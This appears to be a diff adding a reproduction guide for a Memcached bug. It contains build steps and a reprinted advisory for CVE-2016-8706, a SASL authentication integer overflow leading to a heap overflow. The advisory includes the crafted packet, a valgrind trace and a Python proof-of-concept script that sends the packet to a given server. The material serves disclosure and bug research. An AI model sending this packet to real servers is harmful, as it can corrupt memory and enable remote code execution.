@@ -1,0 +1,149 @@
+
+Memcached:
+
+****Dependency:
+
+Memcached uses libevent. Install lib-event first
+
+./configure --prefix=/home/hongyuliu/workspace/apps4doubletake/libevent
+make 
+make install
+
+****Install Memcached:
+     ./configure --prefix=/home/hongyuliu/workspace/apps4doubletake/memcached --enable-64bit --with-libevent=/home/hongyuliu/workspace/apps4doubletake/libevent --enable-sasl
+     make 
+     make install
+
+****Trigger bug:
+
+The script is in “tests” directory
+
+Just run “./run.sh” script.
+
+
+**********more information*********
+Memcached Server SASL Autentication Remote Code Execution Vulnerability
+OCTOBER 31, 2016
+CVE NUMBER
+CVE-2016-8706
+Summary
+An integer overflow in processbinsasl_auth function which is responsible for authentication commands of Memcached binary protocol can be abused to cause heap overflow and lead to remote code execution.
+Tested Versions
+Memcached 1.4.31
+Product URLs
+https://memcached.org/
+CVSSv3 Score
+8.1 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+Details
+Memcached is a high performance object caching server intended for speeding up dynamic web applications and is used by some of the most popular Internet websites. It has two versions of the protocol for storing and retrieving arbitrary data, an ASCII based one and a binary one. The binary protocol is optimized for size.
+If enabled during compilation, Memcached can support authentication using SASL. An integer overflow can be triggered by sending a specially crafted authentication command. The affected command is SASL Auth whose opcode is 0x21.
+The function responsible for parsing an authentication packet is process_bin_sasl_auth:
+static void process_bin_sasl_auth(conn *c) {
+    // Guard for handling disabled SASL on the server.
+    if (!settings.sasl) {
+        write_bin_error(c, PROTOCOL_BINARY_RESPONSE_UNKNOWN_COMMAND, NULL,
+                        c->binary_header.request.bodylen
+                        - c->binary_header.request.keylen);
+        return;
+    }
+
+    assert(c->binary_header.request.extlen == 0);
+
+    int nkey = c->binary_header.request.keylen;     [1]
+    int vlen = c->binary_header.request.bodylen - nkey; [2]
+
+    if (nkey > MAX_SASL_MECH_LEN) {         [3]
+        write_bin_error(c, PROTOCOL_BINARY_RESPONSE_EINVAL, NULL, vlen);
+        c->write_and_go = conn_swallow;
+        return;
+    }
+
+    char *key = binary_get_key(c);
+    assert(key);
+
+    item *it = item_alloc(key, nkey, 0, 0, vlen); [4]
+In the above code, it should be noted that at [1] nkey is declared as a signed integer, and at [2] an integer overflow is possible if the value of bodylen is less than nkey resulting in a small or possibly negative value of vlen which is then used at [4] in a call to item_alloc. At [3] a check limits the values nkey can take (MAXSASLMECH_LEN is 32).
+Function item_alloc is a wrapper around do_item_alloc which allocates the memory for the item and copies the key:
+...
+size_t ntotal = item_make_header(nkey + 1, flags, nbytes, suffix, &nsuffix); [1]
+...
+it = slabs_alloc(ntotal, id, &total_bytes, 0);              [2]
+
+...
+memcpy(ITEM_key(it), key, nkey);                        [3]
+it->exptime = exptime;
+memcpy(ITEM_suffix(it), suffix, (size_t)nsuffix);
+it->nsuffix = nsuffix;
+At [1], nkey corresponds to the specified key length and nbytes to the previously calculated vlen value. At [2] the total resulting value is used as the size for allocation which ends up being too small to hold the key which leads to a heap buffer overflow at [3]. At the time of the overflow, the contents of nkey and the contents of memory pointed to by key are under direct control of the attacker.
+The following packet has all the conditions to trigger the vulnerability:
+MEMCACHED_REQUEST_MAGIC = "\x80"
+OPCODE_SET = "\x21"
+key_len = struct.pack("!H",32)
+body_len = struct.pack("!I",1)
+packet = MEMCACHED_REQUEST_MAGIC + OPCODE_SET + key_len +   body_len*2 + "A"*1000
+In the above packet, body length is specified to be 1, and key length 32, resulting in an integer overflow which causes too little memory to be allocated, causing a heap buffer overflow during a memcpy call.
+Crash Information
+Simply sending the above packet triggers the heap overflow but doesn’t cause a direct crash. In order to observe the issue, the server can be run under valgrind (with SASL authentication enabled) which then results in the following trace:
+<36 new binary client connection.
+36: going from conn_new_cmd to conn_waiting
+36: going from conn_waiting to conn_read
+36: going from conn_read to conn_parse_cmd
+<36 Read binary protocol data:
+<36    0x80 0x21 0x00 0x20
+<36    0x00 0x00 0x00 0x01
+<36    0x00 0x00 0x00 0x01
+<36    0x41 0x41 0x41 0x41
+<36    0x41 0x41 0x41 0x41
+<36    0x41 0x41 0x41 0x41
+authenticated() in cmd 0x21 is true
+36: going from conn_parse_cmd to conn_nread
+==601== Thread 3:
+==601== Invalid write of size 4
+==601==    at 0x8059DD8: do_item_alloc (items.c:242)
+==601==    by 0x8050565: process_bin_sasl_auth (memcached.c:1881)
+==601==    by 0x8050565: complete_nread_binary (memcached.c:2450)
+==601==    by 0x8050565: complete_nread (memcached.c:2484)
+==601==    by 0x80540AE: drive_machine (memcached.c:4656)
+==601==    by 0x40686B5: event_base_loop (in /usr/lib/libevent-2.0.so.5.1.9)
+==601==    by 0x805B1B8: worker_libevent (thread.c:380)
+==601==    by 0x40CB312: start_thread (pthread_create.c:310)
+==601==    by 0x41DAF2D: clone (clone.S:122)
+==601==  Address 0x45adc25 is 1,048,557 bytes inside a block of size 1,048,560 alloc'd
+==601==    at 0x402B211: malloc (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
+==601==    by 0x8056218: memory_allocate (slabs.c:538)
+==601==    by 0x8056218: do_slabs_newslab (slabs.c:233)
+==601==    by 0x8056295: do_slabs_alloc (slabs.c:328)
+==601==    by 0x8056843: slabs_alloc (slabs.c:584)
+==601==    by 0x8059B7D: do_item_alloc (items.c:180)
+==601==    by 0x8050565: process_bin_sasl_auth (memcached.c:1881)
+==601==    by 0x8050565: complete_nread_binary (memcached.c:2450)
+==601==    by 0x8050565: complete_nread (memcached.c:2484)
+==601==    by 0x80540AE: drive_machine (memcached.c:4656)
+==601==    by 0x40686B5: event_base_loop (in /usr/lib/libevent-2.0.so.5.1.9)
+==601==    by 0x805B1B8: worker_libevent (thread.c:380)
+==601==    by 0x40CB312: start_thread (pthread_create.c:310)
+==601==    by 0x41DAF2D: clone (clone.S:122)
+==601==
+Exploit Proof-of-Concept (optional)
+import struct
+import socket
+import sys
+
+
+MEMCACHED_REQUEST_MAGIC = "\x80"
+OPCODE_SET = "\x21"
+key_len = struct.pack("!H",32)
+body_len = struct.pack("!I",1)
+packet = MEMCACHED_REQUEST_MAGIC + OPCODE_SET + key_len +   body_len*2 + "A"*1000
+if len(sys.argv) != 3:
+    print "./poc_sasl.py <server> <ip>"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((sys.argv[1],int(sys.argv[2])))
+s.sendall(packet)
+print s.recv(1024)
+s.close()
+Timeline
+2016-10-10 - Vendor Disclosure
+2016-10-12 - Vendor Patched
+2016-10-31 - Public Release
+
